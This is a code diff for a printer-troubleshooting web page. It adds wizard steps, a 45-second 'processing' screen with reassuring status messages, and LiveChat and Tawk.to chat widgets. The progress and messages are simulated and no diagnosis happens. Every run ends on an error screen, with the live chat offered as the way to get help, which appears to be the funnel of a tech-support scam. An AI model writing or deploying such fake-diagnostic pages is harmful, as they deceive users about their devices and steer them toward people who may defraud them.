+        state.model = el("printerModel").value.trim();
+
+        if(!state.model){
+
+            el("printerModel").focus();
+
+            return;
+
+        }
+
+        el("deviceIssue").textContent = state.issue;
+        el("deviceBrand").textContent = state.brand;
+        el("deviceModel").textContent = state.model;
+
+        /* ORIGINAL WIZARD CONTINUES */
+
+        showStep(4);
+
+    });
+
+
+    /* STEP 4: DEVICE SELECTION */
+
+    el("deviceGrid").addEventListener("click",function(event){
+
+        const card = event.target.closest("[data-device]");
+
+        if(!card)return;
+
+        state.device = card.dataset.device;
+
+        el("connectionIssue").textContent = state.issue;
+        el("connectionBrand").textContent = state.brand;
+        el("connectionModel").textContent = state.model;
+
+        showStep(5);
+
+    });
+
+
+    /* STEP 5: CONNECTION SELECTION */
+
+    el("connectionGrid").addEventListener("click",function(event){
+
+        const card = event.target.closest("[data-connection]");
+
+        if(!card)return;
+
+        state.connection = card.dataset.connection;
+
+        el("summaryIssue").textContent = state.issue;
+        el("summaryBrand").textContent = state.brand;
+        el("summaryModel").textContent = state.model;
+        el("summaryDevice").textContent = state.device;
+        el("summaryConnection").textContent = state.connection;
+
+        showStep(6);
+
+    });
+
+
+    /* BACK BUTTONS */
+
+    document.querySelectorAll("[data-back]").forEach(function(button){
+
+        button.addEventListener("click",function(){
+
+            showStep(Number(this.dataset.back));
+
+        });
+
+    });
+
+
+    /* STEP 6: START PROCESSING */
+
+    el("startProcess").addEventListener("click",function(){
+
+        if(
+            !state.issue ||
+            !state.brand ||
+            !state.model ||
+            !state.device ||
+            !state.connection
+        ){
+            return;
+        }
+
+
+        /* UPDATE ERROR SUMMARY */
+
+        el("errorIssue").textContent = state.issue;
+        el("errorBrand").textContent = state.brand;
+        el("errorModel").textContent = state.model;
+        el("errorDevice").textContent = state.device;
+        el("errorConnection").textContent = state.connection;
+
+
+        /* RESET PROCESSING SCREEN */
+
+        el("processingScreen").hidden = false;
+        el("errorScreen").hidden = true;
+
+        el("percentText").textContent = "0%";
+        el("progressBar").style.width = "0%";
+
+        el("processingStatus").textContent =
+            "Preparing your guided process...";
+
+
+        showStep(7);
+
+
+        if(state.timer){
+
+            clearInterval(state.timer);
+
+            state.timer = null;
+
+        }
+
+
+        /* PROCESSING DURATION: 15 SECONDS */
+
+        /* PROCESSING DURATION: 45 SECONDS */
+
+const duration = 45000;
+
+const started = Date.now();
+
+
+const messages = [
+
+    {
+        at:0,
+        text:"Preparing your guided process..."
+    },
+
+    {
+        at:15,
+        text:"Checking selected printer information..."
+    },
+
+    {
+        at:30,
+        text:"Reviewing printer configuration..."
+    },
+
+    {
+        at:45,
+        text:"Preparing setup information..."
+    },
+
+    {
+        at:60,
+        text:"Checking connection details..."
+    },
+
+    {
+        at:75,
+        text:"Preparing troubleshooting steps..."
+    },
+
+    {
+        at:90,
+        text:"Completing the guided process..."
+    },
+
+    {
+        at:97,
+        text:"Finalizing..."
+    }
+
+];
+
+
+state.timer = setInterval(function(){
+
+    const elapsed = Date.now() - started;
+
+    const percent = Math.min(
+        100,
+        Math.floor((elapsed / duration) * 100)
+    );
+
+
+    /* UPDATE PROGRESS */
+
+    el("percentText").textContent = percent + "%";
+
+    el("progressBar").style.width = percent + "%";
+
+
+    /* UPDATE PROCESSING MESSAGE */
+
+    let currentMessage = messages[0];
+
+    messages.forEach(function(message){
+
+        if(percent >= message.at){
+
+            currentMessage = message;
+
+        }
+
+    });
+
+    el("processingStatus").textContent = currentMessage.text;
+
+
+    /* FINISH AFTER 45 SECONDS */
+
+    if(elapsed >= duration){
+
+        clearInterval(state.timer);
+
+        state.timer = null;
+
+        el("percentText").textContent = "100%";
+
+        el("progressBar").style.width = "100%";
+
+        el("processingScreen").hidden = true;
+
+        el("errorScreen").hidden = false;
+
+        window.scrollTo({
+            top:0,
+            behavior:"smooth"
+        });
+
+    }
+
+},150);
+
+    });
+
+
+    /* TRY AGAIN */
+
+    el("tryAgain").addEventListener("click",function(){
+
+        if(state.timer){
+            clearInterval(state.timer);
+        }
+
+        state.timer = null;
+
+        state.issue = "";
+        state.brand = "";
+        state.model = "";
+        state.device = "";
+        state.connection = "";
+
+        el("printerModel").value = "";
+
+        el("processingScreen").hidden = false;
+        el("errorScreen").hidden = true;
+
+        showStep(1);
+
+    });
+
+
+})();
+</script>
+<!-- =========================================================
+     LIVECHAT WIDGET
+     Existing LiveChat organization ID retained.
+========================================================= -->
+
+<!-- LIVE CHAT -->
+<script>
+window._lc = window._lc || {};
+window.__lc = window.__lc || {};
+
+window.__lc.organizationId = "88021789-6f9a-4e87-ad03-af7e68a3b461";
+window.__lc.integration_name = "manual_onboarding";
+window.__lc.product_name = "text";
+
+(function(n, t, c) {
+    function i(args) {
+        return e._h ? e._h.apply(null, args) : e._q.push(args);
+    }
+
+    var e = {
+        _q: [],
+        _h: null,
+        _v: "2.0",
+
+        on: function() {
+            i(["on", c.call(arguments)]);
+        },
+
+        once: function() {
+            i(["once", c.call(arguments)]);
+        },
+
+        off: function() {
+            i(["off", c.call(arguments)]);
+        },
+
+        get: function() {
+            if (!e._h) {
+                throw new Error("[LiveChatWidget] Widget is not loaded yet.");
+            }
+            return i(["get", c.call(arguments)]);
+        },
+
+        call: function() {
+            i(["call", c.call(arguments)]);
+        },
+
+        init: function() {
+            var s = t.createElement("script");
+            s.async = true;
+            s.type = "text/javascript";
+            s.src = "https://cdn.livechatinc.com/tracking.js";
+            t.head.appendChild(s);
+        }
+    };
+
+    if (!n._lc.asyncInit) {
+        e.init();
+    }
+
+    n.LiveChatWidget = n.LiveChatWidget || e;
+
+})(window, document, [].slice);
+</script>
+
+
+<script>
+function openLiveChat() {
+    if (window.Tawk_API && typeof window.Tawk_API.maximize === "function") {
+        window.Tawk_API.maximize();
+        return;
+    }
+    if (window.LiveChatWidget && typeof window.LiveChatWidget.call === "function") {
+        window.LiveChatWidget.call("maximize");
+        return;
+    }
+    var attempts = 0;
+    var timer = setInterval(function() {
+        attempts++;
+        if (window.Tawk_API && typeof window.Tawk_API.maximize === "function") {
+            window.Tawk_API.maximize();
+            clearInterval(timer);
+        } else if (window.LiveChatWidget && typeof window.LiveChatWidget.call === "function") {
+            window.LiveChatWidget.call("maximize");
+            clearInterval(timer);
+        }
+        if (attempts >= 25) clearInterval(timer);
+    }, 100);
+}
+</script>
+
+<!-- Tawk.to Integration -->
+<script type="text/javascript">
+var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+(function(){
+var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+s1.async=true;
+s1.src='https://embed.tawk.to/6a25e667be9ae91c2b2dece4/default';
+s1.charset='UTF-8';
+s1.setAttribute('crossorigin','*');
+s0.parentNode.insertBefore(s1,s0);
+})();
+</script>
+
+</body>
+</html>
